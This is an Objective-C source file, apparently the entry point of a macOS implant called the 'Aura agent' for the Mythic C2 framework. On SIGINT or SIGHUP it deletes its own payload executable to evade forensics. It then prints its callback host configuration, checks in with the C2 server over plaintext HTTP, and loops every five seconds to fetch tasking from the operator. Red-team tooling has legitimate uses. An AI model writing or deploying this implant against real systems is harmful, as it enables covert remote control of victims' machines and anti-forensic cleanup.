#import <Foundation/Foundation.h>
#import "HTTPC2Config.h"
#import "SystemInfoHelper.h"
#import "C2CheckIn.h"
#include <signal.h>

/// Handle the case where we need to quickly delete the payload image for OPSEC
void handleSignal(int signal) {
    NSLog(@"🥷 Received SIGNAL (Ctrl-C). Quickly remove the payload image!");
    BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
    exit(0);
}

/// Aura agent entry point
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        /// Register a few OPSEC signals
        signal(SIGINT, handleSignal);
        signal(SIGHUP, handleSignal);

        /// Print out the stamped C2 configuration data from Mythic
        NSLog(@"C2 Configuration Data:");
        NSLog(@"Callback Host: %@", [HTTPC2Config callbackHost]);
        NSLog(@"Callback Port: %ld", (long)[HTTPC2Config callbackPort]);
        NSLog(@"Headers: %@", [HTTPC2Config headers]);
        NSLog(@"Payload UUID: %@", [HTTPC2Config payloadUUID]);

        /// Perform the HTTP plaintext check-in
        [C2CheckIn performPlaintextCheckin];

        /// Loop to get tasking on an interval -- this will update our tasking
        while (true) {
            [C2CheckIn getTasking];
            [NSThread sleepForTimeInterval:5.0];
        }
    }

    return 0;
}
